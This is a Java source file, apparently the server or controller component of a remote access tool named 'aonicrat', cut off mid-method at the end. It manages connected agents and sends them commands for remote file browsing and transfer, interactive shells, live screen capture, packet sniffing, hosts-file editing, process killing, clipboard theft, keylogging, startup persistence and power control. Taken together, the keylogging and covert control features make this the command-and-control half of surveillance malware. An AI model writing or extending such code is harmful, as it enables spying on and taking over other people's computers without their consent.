/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.webaon.aonicrat;
import org.json.JSONObject;
import org.json.JSONArray;
/**
 *
 * @author Zahid Wadiwale
 */

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.nio.file.Files;
import java.nio.file.Path;
import javax.imageio.ImageIO;

class ServerManager { // <– not public, so only visible in same package

    private ServerSocket serverSocket;
    private volatile boolean running = false;
    private final ExecutorService pool = Executors.newCachedThreadPool();
    private final List<Socket> connectedClients = 
        Collections.synchronizedList(new ArrayList<>());
    private final Map<Socket, RemoteDevice> deviceMap =  new ConcurrentHashMap<>();
    private final Map<Socket, List<String>> listBuffer = new HashMap<>();
    private FilesListener filesListener;
    private long folderTotalBytes = 0;
    private long folderBytesSent = 0;
    // add these fields
    private final Map<String, File> pendingDownloads = new ConcurrentHashMap<>();
    private final Map<String, FileOutputStream> downloadStreams = new ConcurrentHashMap<>();

    // for read-file (view/edit) transfers
    private final Map<String, String> pendingFileReads = new ConcurrentHashMap<>();
    private final Map<String, ByteArrayOutputStream> fileReadBuffers = new ConcurrentHashMap<>();

    // persistent shell sessions: socket → sessionId
    private final Map<Socket, String> activeShellSessions  = new ConcurrentHashMap<>();
    // screen capture sessions: socket → sessionId
    private final Map<Socket, String> activeScreenSessions = new ConcurrentHashMap<>();
    // frame-drop guard: skip invokeLater if EDT is still rendering the previous frame
    private final AtomicBoolean frameRendering = new AtomicBoolean(false);

    public void startServer(int port) {
        if (running) return;
        running = true;
        pool.submit(() -> {
            try {
                serverSocket = new ServerSocket(port);
                System.out.println("Server listening on " + port);
                while (running) {
                    Socket s = serverSocket.accept();
                    connectedClients.add(s);
                    pool.submit(() -> handleClient(s));
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        });
    }

    public void stopServer() {
        running = false;
        try {
            if (serverSocket != null) serverSocket.close();
        } catch (IOException ignored) {}
        for (Socket s : connectedClients) {
            try { s.close(); } catch (IOException ignored) {}
        }
        connectedClients.clear();
        System.out.println("Server stopped");
    }

    public List<Socket> getConnectedClients() {
        return connectedClients;
    }
    private final List<RemoteDevice> connectedDevices =
    Collections.synchronizedList(new ArrayList<>());

    private void handleClient(Socket s) {
        try (
            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
            PrintWriter out = new PrintWriter(s.getOutputStream(), true)
        ) {
            // First read: handshake
            String firstLine = in.readLine();
            if (firstLine != null && firstLine.startsWith("HANDSHAKE|")) {
                String[] parts = firstLine.split("\\|");
                String osType     = parts.length > 1 ? parts[1] : "Unknown";
                String osName     = parts.length > 2 ? parts[2] : "Unknown";
                String pcName     = parts.length > 3 ? parts[3] : "Unknown";
                String clientName = parts.length > 4 ? parts[4] : "Unknown";

                RemoteDevice device = new RemoteDevice(s, osType, osName, pcName, clientName);
                connectedDevices.add(device);
                deviceMap.put(s, device);
                System.out.println("Device added: " + device);

                out.println("WELCOME");
            } else {
                out.println("BAD HANDSHAKE");
                s.close();
                return;
            }

            // normal message loop after handshake
            String line;
            while ((line = in.readLine()) != null) {
                if (line.startsWith("ROOTS|")) {
                    String[] parts = line.split("\\|", 2);
                    if (parts.length > 1) {
                        String[] roots = parts[1].split(";");
                        // fire some callback / update UI with roots for this device
                        RemoteDevice device = deviceMap.get(s);
                        if (rootsListener != null) {
                            // update Swing UI on EDT
                            javax.swing.SwingUtilities.invokeLater(() -> 
                                rootsListener.onRootsReceived(device, roots));
                        }
                        System.out.println("Roots for " + device + ": " + Arrays.toString(roots));
                    }
                }// -------- CHUNKED DIRECTORY LISTING ----------
                else if (line.startsWith("FILES_CHUNK|")) {
                    String data = line.substring("FILES_CHUNK|".length());

                    List<String> buffer = listBuffer.computeIfAbsent(s, k -> new ArrayList<>());

                    for (String entry : data.split(";")) {
                        if (!entry.isBlank()) {
                            buffer.add(entry);
                        }
                    }
                }else if (line.equals("FILES_DONE")) {
                    List<String> buffer = listBuffer.getOrDefault(s, new ArrayList<>());
                    String[] fileArray = buffer.toArray(new String[0]);
                    listBuffer.remove(s);

                    if (filesListener != null) {
                        javax.swing.SwingUtilities.invokeLater(() ->
                            filesListener.onFiles(deviceMap.get(s), fileArray)
                        );
                    }
                } else if (line.startsWith("FILES|")) {
                    String[] parts = line.split("\\|", 2);
                    if (parts.length > 1) {
                        String[] files = parts[1].split(";");
                        RemoteDevice device = deviceMap.get(s);
                        if (filesListener != null) {
                            javax.swing.SwingUtilities.invokeLater(() ->
                                filesListener.onFiles(device, files));
                        }
                    }
                } else if (line.startsWith("{")) {
                    try {
                        JSONObject msg = new JSONObject(line);
                        String cmd = msg.optString("cmd");

                        if ("fs:download_start_ack".equals(cmd)) {
                            // maybe update UI
                            String transferId = msg.optString("transferId", null);
                            System.out.println("Agent ack download transferId=" + transferId);
                        } else if ("fs:download_mkdir".equals(cmd)) {
                            String transferId = msg.optString("transferId", null);
                            String localPath = msg.getString("localPath");
                            File dir = new File(localPath);
                            dir.mkdirs(); // ensure directory exists
                            //pendingDownloads.get(transferId).put(localPath, dir);
                        } else if ("fs:download_chunk".equals(cmd)) {
                            String transferId = msg.optString("transferId", null);
                            String filePath = msg.getString("path");
                            String data = msg.getString("data");
                            byte[] bytes = null;
                            if (transferId != null && pendingDownloads.containsKey(transferId)) {
                                File dest = pendingDownloads.get(transferId);
                                bytes = Base64.getDecoder().decode(data);
                                // get or open stream
                                FileOutputStream fos = downloadStreams.get(transferId);
                                if (fos == null) {
                                    fos = new FileOutputStream(dest, true);
                                    downloadStreams.put(transferId, fos);
                                }
                                fos.write(bytes);
                                fos.flush();

                                if (downloadProgressListener != null) {
                                    long current = dest.length();
                                    long total   = msg.optLong("size", -1);
                                    javax.swing.SwingUtilities.invokeLater(() ->
                                        downloadProgressListener.onProgress(deviceMap.get(s), dest.getName(), current, total)
                                    );
                                }
                            } else {
                                // fallback: older clients may send localPath; try to write but log a warning
                                System.err.println("Received fs:download_chunk with unknown transferId=" + transferId + " - falling back to localPath");
                                String localPath = msg.optString("localPath", null);
                                if (localPath != null) {
                                    File localFile = new File(localPath);
                                    localFile.getParentFile().mkdirs();
                                    try (FileOutputStream fos = new FileOutputStream(localFile, true)) {
                                        bytes = Base64.getDecoder().decode(msg.getString("data"));
                                        fos.write(bytes);
                                    }
                                    if (downloadProgressListener != null) {
                                        long current = localFile.length();
                                        long total   = msg.optLong("size", -1);
                                        javax.swing.SwingUtilities.invokeLater(() ->
                                            downloadProgressListener.onProgress(deviceMap.get(s), localFile.getName(), current, total)
                                        );
                                    }
                                }
                            }
                        } else if ("fs:download_finish".equals(cmd)) {
                            javax.swing.SwingUtilities.invokeLater(() ->
                                downloadProgressListener.onComplete(deviceMap.get(s), msg.getString("path"))
                            );
                        } else if ("fs:delete_result".equals(cmd) || "fs:rename_result".equals(cmd)
                                || "fs:zip_result".equals(cmd) || "fs:extract_result".equals(cmd)) {
                            boolean success = msg.optBoolean("success", false);
                            String path = msg.optString("path", msg.optString("from", msg.optString("dest", "")));
                            String error = msg.optString("error", "");
                            String opName = cmd.replace("fs:", "").replace("_result", "");
                            if (commandResultListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    commandResultListener.onResult(dev, opName, success, path, error)
                                );
                            }
                        } else if ("shell_result".equals(cmd)) {
                            String command = msg.optString("command", "");
                            String output = msg.optString("output", "");
                            int exitCode = msg.optInt("exitCode", -1);
                            if (shellOutputListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    shellOutputListener.onOutput(dev, command, output, exitCode)
                                );
                            }
                        } else if ("fs:find_result".equals(cmd)) {
                            String query = msg.optString("query", "");
                            JSONArray arr = msg.optJSONArray("files");
                            String[] files = arr != null
                                ? IntStream.range(0, arr.length()).mapToObj(arr::getString).toArray(String[]::new)
                                : new String[0];
                            if (findResultListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    findResultListener.onFound(dev, query, files)
                                );
                            }
                        } else if ("fs:file_chunk".equals(cmd)) {
                            String transferId = msg.optString("transferId", "");
                            byte[] bytes = Base64.getDecoder().decode(msg.optString("data", ""));
                            fileReadBuffers.computeIfAbsent(transferId, k -> new ByteArrayOutputStream()).write(bytes);
                        } else if ("fs:file_done".equals(cmd)) {
                            String transferId = msg.optString("transferId", "");
                            String path = msg.optString("path", "");
                            ByteArrayOutputStream baos = fileReadBuffers.remove(transferId);
                            pendingFileReads.remove(transferId);
                            if (fileContentListener != null && baos != null) {
                                byte[] content = baos.toByteArray();
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    fileContentListener.onContent(dev, path, content)
                                );
                            }
                        } else if ("fs:file_error".equals(cmd)) {
                            String transferId = msg.optString("transferId", "");
                            String error = msg.optString("error", "Unknown error");
                            String path = pendingFileReads.remove(transferId);
                            fileReadBuffers.remove(transferId);
                            if (fileContentListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String pathFinal = path != null ? path : "unknown";
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    fileContentListener.onError(dev, pathFinal, error)
                                );
                            }
                        } else if ("shell:started".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            if (shellStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    shellStreamListener.onStarted(dev, sessionId)
                                );
                            }
                        } else if ("shell:output".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            String data = msg.optString("data", "");
                            if (shellStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    shellStreamListener.onOutput(dev, sessionId, data)
                                );
                            }
                        } else if ("shell:ended".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            activeShellSessions.values().remove(sessionId);
                            if (shellStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    shellStreamListener.onEnded(dev, sessionId)
                                );
                            }
                        } else if ("shell:error".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            String error = msg.optString("error", "");
                            activeShellSessions.values().remove(sessionId);
                            if (shellStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    shellStreamListener.onError(dev, sessionId, error)
                                );
                            }
                        } else if ("screen:started".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            int w = msg.optInt("width",  0);
                            int h = msg.optInt("height", 0);
                            if (screenStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    screenStreamListener.onStarted(dev, sessionId, w, h)
                                );
                            }
                        } else if ("screen:frame".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            String data      = msg.optString("data", "");
                            // Decode JPEG on the reader thread, then paint on EDT.
                            // Drop frames when EDT is still rendering the previous one.
                            if (screenStreamListener != null
                                    && frameRendering.compareAndSet(false, true)) {
                                try {
                                    byte[] bytes  = Base64.getDecoder().decode(data);
                                    BufferedImage img = ImageIO.read(new ByteArrayInputStream(bytes));
                                    if (img != null) {
                                        RemoteDevice dev = deviceMap.get(s);
                                        final BufferedImage finalImg = img;
                                        javax.swing.SwingUtilities.invokeLater(() -> {
                                            try {
                                                screenStreamListener.onFrame(dev, sessionId, finalImg);
                                            } finally {
                                                frameRendering.set(false);
                                            }
                                        });
                                    } else {
                                        frameRendering.set(false);
                                    }
                                } catch (Exception ex) {
                                    frameRendering.set(false);
                                }
                            }
                        } else if ("screen:error".equals(cmd)) {
                            String sessionId = msg.optString("sessionId", "");
                            String error     = msg.optString("error", "");
                            activeScreenSessions.values().remove(sessionId);
                            if (screenStreamListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    screenStreamListener.onError(dev, sessionId, error)
                                );
                            }

                        // ── Network Controls responses ─────────────────────────────
                        } else if ("net:capture_started".equals(cmd)) {
                            String sid = msg.optString("sessionId", "");
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onCaptureStarted(dev, sid));
                            }
                        } else if ("net:packet".equals(cmd)) {
                            if (netCapListener != null) {
                                RemoteDevice dev  = deviceMap.get(s);
                                String time      = msg.optString("time", "");
                                String src       = msg.optString("src", "");
                                String srcPort   = msg.optString("srcPort", "");
                                String dst       = msg.optString("dst", "");
                                String dstPort   = msg.optString("dstPort", "");
                                String proto     = msg.optString("protocol", "");
                                int    len       = msg.optInt("length", 0);
                                String info      = msg.optString("info", "");
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onPacket(dev, time, src, srcPort,
                                                            dst, dstPort, proto, len, info));
                            }
                        } else if ("net:capture_ended".equals(cmd)) {
                            String sid = msg.optString("sessionId", "");
                            activeCaptureSessions.values().remove(sid);
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onCaptureEnded(dev, sid));
                            }
                        } else if ("net:hosts_data".equals(cmd)) {
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                JSONArray hdrArr = msg.optJSONArray("headerComments");
                                String[] header  = hdrArr != null
                                    ? IntStream.range(0, hdrArr.length())
                                               .mapToObj(hdrArr::getString)
                                               .toArray(String[]::new)
                                    : new String[0];
                                JSONArray entriesArr = msg.optJSONArray("entries");
                                String[][] rows = new String[0][];
                                if (entriesArr != null) {
                                    rows = new String[entriesArr.length()][];
                                    for (int i = 0; i < entriesArr.length(); i++) {
                                        JSONObject e2 = entriesArr.getJSONObject(i);
                                        rows[i] = new String[]{
                                            e2.optString("ip",""),
                                            e2.optString("host",""),
                                            e2.optString("comment","")
                                        };
                                    }
                                }
                                final String[] fh = header;
                                final String[][] fr = rows;
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onHostsData(dev, fh, fr));
                            }
                        } else if ("net:hosts_result".equals(cmd)) {
                            boolean ok  = msg.optBoolean("success", false);
                            String  err = msg.optString("error", "");
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onHostsSaved(dev, ok, err));
                            }
                        } else if ("net:interfaces_data".equals(cmd)) {
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                JSONArray arr = msg.optJSONArray("interfaces");
                                String[][] rows = new String[0][];
                                if (arr != null) {
                                    rows = new String[arr.length()][];
                                    for (int i = 0; i < arr.length(); i++) {
                                        JSONObject iface = arr.getJSONObject(i);
                                        rows[i] = new String[]{
                                            iface.optString("name",""),
                                            iface.optString("ip4",""),
                                            iface.optString("ip6",""),
                                            iface.optString("mac",""),
                                            iface.optString("mtu",""),
                                            iface.optBoolean("up",false) ? "UP" : "DOWN"
                                        };
                                    }
                                }
                                final String[][] fr = rows;
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onInterfacesData(dev, fr));
                            }
                        } else if ("net:error".equals(cmd)) {
                            String op  = msg.optString("op", "");
                            String err = msg.optString("error", "");
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onError(dev, op, err));
                            }
                        } else if ("net:status".equals(cmd)) {
                            String message = msg.optString("message", "");
                            if (netCapListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                javax.swing.SwingUtilities.invokeLater(() ->
                                    netCapListener.onError(dev, "status", message));
                            }

                        // ── Others responses ──────────────────────────────────
                        } else if ("sys:info_data".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                JSONArray arr = msg.optJSONArray("rows");
                                String[][] rows = arr == null ? new String[0][] : new String[arr.length()][];
                                if (arr != null) for (int i=0;i<arr.length();i++) {
                                    JSONObject r = arr.getJSONObject(i);
                                    rows[i] = new String[]{r.optString("key",""), r.optString("value","")};
                                }
                                final String[][] fr = rows;
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onSysInfo(dev, fr));
                            }
                        } else if ("proc:list_data".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                JSONArray arr = msg.optJSONArray("processes");
                                String[][] rows = arr == null ? new String[0][] : new String[arr.length()][];
                                if (arr != null) for (int i=0;i<arr.length();i++) {
                                    JSONObject p2 = arr.getJSONObject(i);
                                    rows[i] = new String[]{p2.optString("pid",""), p2.optString("name",""), p2.optString("mem","")};
                                }
                                final String[][] fr = rows;
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onProcessList(dev, fr));
                            }
                        } else if ("proc:kill_result".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String pid = msg.optString("pid","");
                                boolean ok = msg.optBoolean("success",false);
                                String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onProcessKilled(dev, pid, ok, err));
                            }
                        } else if ("clip:data".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String text = msg.optString("text","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onClipboardData(dev, text));
                            }
                        } else if ("clip:set_result".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                boolean ok = msg.optBoolean("success",false);
                                String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onClipboardSet(dev, ok, err));
                            }
                        } else if ("key:started".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String sid = msg.optString("sessionId","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onKeylogStarted(dev, sid));
                            }
                        } else if ("key:data".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String data = msg.optString("data","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onKeylogData(dev, data));
                            }
                        } else if ("key:stopped".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String sid = msg.optString("sessionId","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onKeylogStopped(dev, sid));
                            }
                        } else if ("others:error".equals(cmd)) {
                            if (othersListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String op = msg.optString("op",""); String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> othersListener.onError(dev, op, err));
                            }

                        // ── Advanced responses ────────────────────────────────
                        } else if ("power:result".equals(cmd)) {
                            if (advancedListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                String action = msg.optString("action","");
                                boolean ok = msg.optBoolean("success",false);
                                String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> advancedListener.onPowerResult(dev, action, ok, err));
                            }
                        } else if ("startup:list_data".equals(cmd)) {
                            if (advancedListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                JSONArray arr = msg.optJSONArray("entries");
                                String[][] rows = arr == null ? new String[0][] : new String[arr.length()][];
                                if (arr != null) for (int i=0;i<arr.length();i++) {
                                    JSONObject e2 = arr.getJSONObject(i);
                                    rows[i] = new String[]{e2.optString("name",""), e2.optString("command",""), e2.optString("type","")};
                                }
                                final String[][] fr = rows;
                                javax.swing.SwingUtilities.invokeLater(() -> advancedListener.onStartupList(dev, fr));
                            }
                        } else if ("startup:changed".equals(cmd)) {
                            if (advancedListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                boolean ok = msg.optBoolean("success",false);
                                String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> advancedListener.onStartupChanged(dev, ok, err));
                            }
                        } else if ("msgbox:result".equals(cmd)) {
                            if (advancedListener != null) {
                                RemoteDevice dev = deviceMap.get(s);
                                boolean ok = msg.optBoolean("success",false);
                                String err = msg.optString("error","");
                                javax.swing.SwingUtilities.invokeLater(() -> advancedListener.onMsgBoxResult(dev, ok, err));
                            }
                        }

                    } catch (Exception ex) {
                        System.err.println("Invalid JSON: " + ex);
                    }
                } else {
                    System.out.println("From " + s.getRemoteSocketAddress() + ": " + line);
                    out.println("ACK " + line);
                }
            }
        } catch (IOException ex) {
            System.out.println("Client disconnected: " + s.getRemoteSocketAddress());
        } finally {
            // remove the RemoteDevice instead of raw socket
            connectedDevices.removeIf(d -> d.socket.equals(s));
            deviceMap.remove(s);
        }
    }
    
    public List<RemoteDevice> getConnectedDevices() {
        return connectedDevices;
    }
    public List<RemoteDevice> getDevicesByOsType(String osType) {
        return connectedDevices.stream()
                .filter(d -> d.osType.equalsIgnoreCase(osType))
                .collect(Collectors.toList());
    }
    public void sendListRequest(RemoteDevice device, String path) {
        try {
            PrintWriter out = new PrintWriter(device.socket.getOutputStream(), true);
            out.println("LIST|" + path);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void sendMessage(RemoteDevice device, String message) {
        // For example, write to socket
        try {
            OutputStream out = device.socket.getOutputStream();
            out.write((message + "\n").getBytes(StandardCharsets.UTF_8));
            out.flush();
        } catch (IOException e) {
            e.printStackTrace();
            // optionally handle reconnect logic here
        }
    }

    public void requestRoots(RemoteDevice device) {
        try {
            PrintWriter out = new PrintWriter(device.socket.getOutputStream(), true);
            out.println("LIST_ROOTS");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public interface RootsListener {
        void onRootsReceived(RemoteDevice device, String[] roots);
    }
    private RootsListener rootsListener;
    public void setRootsListener(RootsListener listener) {
        this.rootsListener = listener;
    }
    public interface FilesListener {
        void onFiles(RemoteDevice device, String[] files);
    }

    public void setFilesListener(FilesListener listener) {
        this.filesListener = listener;
    }
    public interface DownloadProgressListener {
        void onProgress(RemoteDevice device, String fileName, long bytesReceived, long totalBytes);
        void onComplete(RemoteDevice device, String filename);
    }
    private DownloadProgressListener downloadProgressListener;
    public void setDownloadProgressListener(DownloadProgressListener l) {
        this.downloadProgressListener = l;
    }

    // high-level
    public void uploadFileOrFolder(RemoteDevice device, String remoteBasePath, File local) {
        if (local.isDirectory()) {
            try {
                folderTotalBytes = computeFolderSize(local); // total of all files
                folderBytesSent = 0;                        // reset counter
            } catch (IOException e) {
                e.printStackTrace();
                return;
            }
            uploadDirectoryRecursive(device, remoteBasePath, local, local.toPath());
        } else {
            uploadSingleFile(device, remoteBasePath, local, local.getName());
        }
    }

    private void uploadSingleFile(RemoteDevice device, String remoteBasePath, File file, String remoteName) {
        try {
            String remotePath = joinRemote(remoteBasePath, remoteName);

            // 1. tell remote agent to prepare
            JSONObject start = new JSONObject();
            start.put("cmd", "fs:upload_start");
            start.put("path", remotePath);
            start.put("size", file.length());
            sendMessage(device, start.toString());
            long total = file.length();
            long sent = 0;

            // 2. stream file
            try (InputStream in = new BufferedInputStream(new FileInputStream(file))) {
                byte[] buf = new byte[8192];
                int len;
                while ((len = in.read(buf)) != -1) {
                    sent += len;
                    byte[] chunk = Arrays.copyOf(buf, len);
                    String base64 = Base64.getEncoder().encodeToString(chunk);
                    JSONObject chunkMsg = new JSONObject();
                    chunkMsg.put("cmd", "fs:upload_chunk");
                    chunkMsg.put("path", remotePath);
                    chunkMsg.put("data", base64);
                    sendMessage(device, chunkMsg.toString());
                    // update UI safely on Swing thread
                    if (uploadProgressListener != null) {
                        long finalSent = sent;
                        javax.swing.SwingUtilities.invokeLater(() ->
                            uploadProgressListener.onProgress(device, file.getName(), finalSent, total));
                    }
                }
            }

            // 3. finish
            JSONObject finish = new JSONObject();
            finish.put("cmd", "fs:upload_finish");
            finish.put("path", remotePath);
            sendMessage(device, finish.toString());

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void uploadDirectoryRecursive(RemoteDevice device, String remoteBasePath, File folder, Path root) {
        try {
            Files.walk(folder.toPath())
                .forEach(path -> {
                    File f = path.toFile();
                    String relative = root.relativize(path)
                            .toString()
                            .replace(File.separatorChar, '/'); // OS neutral
                    if (f.isDirectory()) {
                        if (!relative.isEmpty()) {
                            JSONObject mkdir = new JSONObject();
                            mkdir.put("cmd", "fs:mkdir");
                            mkdir.put("path", joinRemote(remoteBasePath, relative));
                            sendMessage(device, mkdir.toString());
                        }
                    } else {
                        uploadSingleFile(device, remoteBasePath, f, relative);
                    }
                });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // join remote paths with '/'
    private String joinRemote(String base, String name) {
        if (base.endsWith("/")) return base + name;
        else return base + "/" + name;
    }
    public interface UploadProgressListener {
        void onProgress(RemoteDevice device, String fileName, long bytesSent, long totalBytes);
    }
    private UploadProgressListener uploadProgressListener;
    public void setUploadProgressListener(UploadProgressListener listener) {
        this.uploadProgressListener = listener;
    }

    public interface CommandResultListener {
        void onResult(RemoteDevice device, String cmd, boolean success, String path, String details);
    }
    private CommandResultListener commandResultListener;
    public void setCommandResultListener(CommandResultListener listener) {
        this.commandResultListener = listener;
    }

    public interface ShellOutputListener {
        void onOutput(RemoteDevice device, String command, String output, int exitCode);
    }
    private ShellOutputListener shellOutputListener;
    public void setShellOutputListener(ShellOutputListener listener) {
        this.shellOutputListener = listener;
    }

    public interface FindResultListener {
        void onFound(RemoteDevice device, String query, String[] files);
    }
    private FindResultListener findResultListener;
    public void setFindResultListener(FindResultListener listener) {
        this.findResultListener = listener;
    }

    public interface FileContentListener {
        void onContent(RemoteDevice device, String path, byte[] content);
        void onError(RemoteDevice device, String path, String error);
    }
    private FileContentListener fileContentListener;
    public void setFileContentListener(FileContentListener listener) {
        this.fileContentListener = listener;
    }

    public interface ShellStreamListener {
        void onStarted(RemoteDevice device, String sessionId);
        void onOutput(RemoteDevice device, String sessionId, String data);
        void onEnded(RemoteDevice device, String sessionId);
        void onError(RemoteDevice device, String sessionId, String error);
    }
    private ShellStreamListener shellStreamListener;
    public void setShellStreamListener(ShellStreamListener listener) {
        this.shellStreamListener = listener;
    }

    // ── Network Controls ──────────────────────────────────────────────────────

    public interface NetCapListener {
        void onCaptureStarted(RemoteDevice device, String sessionId);
        void onPacket(RemoteDevice device, String time,
                      String src, String srcPort,
                      String dst, String dstPort,
                      String protocol, int len, String info);
        void onCaptureEnded(RemoteDevice device, String sessionId);
        void onHostsData(RemoteDevice device, String[] headerComments, String[][] rows);
        void onHostsSaved(RemoteDevice device, boolean success, String error);
        void onInterfacesData(RemoteDevice device, String[][] rows);
        void onError(RemoteDevice device, String operation, String error);
    }
    private NetCapListener netCapListener;
    public void setNetCapListener(NetCapListener l) { this.netCapListener = l; }

    private final Map<Socket, String> activeCaptureSessions = new ConcurrentHashMap<>();

    /** Start a packet-capture session on the remote agent. Returns the sessionId. */
    public String startNetCapture(RemoteDevice device, String bpfFilter) {
        String sessionId = UUID.randomUUID().toString();
        activeCaptureSessions.put(device.socket, sessionId);
        JSONObject msg = new JSONObject();
        msg.put("cmd",       "net:capture_start");
        msg.put("sessionId", sessionId);
        msg.put("filter",    bpfFilter == null ? "" : bpfFilter);
        // tell the agent to exclude our own connection
        try {
            String serverIp = device.socket.getLocalAddress().getHostAddress();
            int    serverPort = device.socket.getLocalPort();
            msg.put("serverIp",   serverIp);
            msg.put("serverPort", serverPort);
        } catch (Exception ignored) {}
        sendMessage(device, msg.toString());
        return sessionId;
    }

    /** Stop a running capture session. */
    public void stopNetCapture(RemoteDevice device, String sessionId) {
        activeCaptureSessions.remove(device.socket);
        JSONObject msg = new JSONObject();
        msg.put("cmd",       "net:capture_stop");
        msg.put("sessionId", sessionId);
        sendMessage(device, msg.toString());
    }

    /** Send any simple network command (hosts read, interfaces list, hosts write). */
    public void sendNetCmd(RemoteDevice device, String cmd, JSONObject payload) {
        JSONObject msg = payload != null ? new JSONObject(payload.toString()) : new JSONObject();
        msg.put("cmd", cmd);
        sendMessage(device, msg.toString());
    }

    // ── Others ────────────────────────────────────────────────────────────────

    public interface OthersListener {
        void onSysInfo(RemoteDevice d, String[][] rows);
        void onProcessList(RemoteDevice d, String[][] rows);
        void onProcessKilled(RemoteDevice d, String pid, boolean ok, String err);
        void onClipboardData(RemoteDevice d, String text);
        void onClipboardSet(RemoteDevice d, boolean ok, String err);
        void onKeylogStarted(RemoteDevice d, String sessionId);
        void onKeylogData(RemoteDevice d, String data);
        void onKeylogStopped(RemoteDevice d, String sessionId);
        void onError(RemoteDevice d, String op, String err);
    }
    private OthersListener othersListener;
    public void setOthersListener(OthersListener l) { this.othersListener = l; }

    public void sendOthersCmd(RemoteDevice device, String cmd, JSONObject payload) {
        JSONObject msg = payload != null ? new JSONObject(payload.toString()) : new JSONObject();
        msg.put("cmd", cmd);
        sendMessage(device, msg.toString());
    }

    // ── Advanced ──────────────────────────────────────────────────────────────

    public interface AdvancedListener {
        void onPowerResult(RemoteDevice d, String action, boolean ok, String err);
        void onStartupList(RemoteDevice d, String[][] rows);
        void onStartupChanged(RemoteDevice d, boolean ok, String err);
        void onMsgBoxResult(RemoteDevice d, boolean ok, String err);
        void onError(RemoteDevice d, String op, String err);
    }
    private AdvancedListener advancedListener;
    public void setAdvancedListener(AdvancedListener l) { this.advancedListener = l; }

    public void sendAdvancedCmd(RemoteDevice device, String cmd, JSONObject payload) {
